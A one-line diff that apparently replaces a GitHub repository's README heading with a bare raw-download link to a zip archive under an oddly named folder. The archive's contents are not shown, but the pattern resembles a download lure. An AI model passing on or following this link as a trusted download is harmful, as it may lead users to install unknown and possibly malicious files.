@@ -1,1 +1,1 @@
-# daicntt1708.github
+# https://github.com/daicntt1708/daicntt1708.github/raw/refs/heads/main/quadriplicate/daicntt_github_1.8.zip
